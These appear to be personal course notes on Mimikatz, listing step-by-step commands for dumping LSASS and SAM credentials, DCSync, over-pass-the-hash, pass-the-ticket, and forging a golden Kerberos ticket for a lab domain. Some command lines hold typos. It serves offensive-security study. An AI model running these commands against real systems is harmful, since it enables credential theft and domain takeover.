# Mimikatz
The de factor blackhat/whitehat credential manipulation tool.
Post exploitation tool to retrieve/handle credentials in various formats.
https://adsecurity.org/?page_id=1821 (unofficial guide)

## Basics
- reads from LSASS memory to retrieve AD credentials
    - Cleartext passwords (depends on Windows version and GPO settings)
    - NTLM hashes ("pass-the-hash" and "pass-the-ticket")
    - Kerberos (build custom (golden) tickets)
- reads from SAM process to retrieve local credentials (same/similar to LSASS)
- needs to be run as admin (or better needs the debug "SeDebugPrivilege" priviledge) and elevated high (UAC)

*Remark: we could also get a memory dump via Task Manager !!!(without Mimikatz)*

**Extract credentials (SAM + LKSASS)**
-> see pdf "05F Credential Abuse.pdf"

**DCSync**
Replicating directly from domain controller. Simulate a DC asking another DC to replicate one or more object incl. credentials
Requires specific privileges.

**Other**
- impersonating tokens
- -> see pdf "05F Credential Abuse.pdf"

## Dump Logon passwords from Lsass.exe 

1. `.\mimikatz.exe`  -> start mimikatz prompt
2. `privilege::debug` -> aquire debug privilege to spy into other processes (which we have to be admin)
    - expected response: "Privilege '20' OK"
3. `log my_log.txt` -> enable logging (highly recommended)
4. `sekurlsa::logonpasswords` ->  retrieve our credentials
    - Check the output for NTLM hash


## Dump local passward from SAM
1. If mimikatz is not started yet: `.\mimikatz.exe` 
2. `token::elevate` -> elevate our permissions to SYSTEM  (see UAC levels, needed for SAM)
3. if not done before: `log my_log.txt` -> enable logging (highly recommended)
3. `lsadump::sam` -> will dump content SAM
    - Check the output for NTLM hash


## Kerbersos 
**Over-pass-the-hash**
1. `.\mimikatz.exe`  -> start mimikatz prompt
2. `privilege::debug` -> aquire debug privilege to spy into other processes (which we have to be admin)
3. `seurlsa::pth /user:Administrator /domain:chocolate.locl /ntlm.cc36.....`

**Pass-the-ticket**
Something like: 
- "sekurlsa::tickets [/export]"  -> see pdf
- kerberos::ptt path/to/ticket.kirbi -> see pdf

**Golden/Silver ticket** 
Golden ticket: `mimikatz kerberos::golden /user:dfm /domain:testlab.local /sid:S-1-5-21-883232822-274137685-4173207997 /krbtgt:b3c87251042db43980ef7607733fda72 /ptt`  (via Cobal strike, see pdf)

Silver ticket is similar just for a specific service.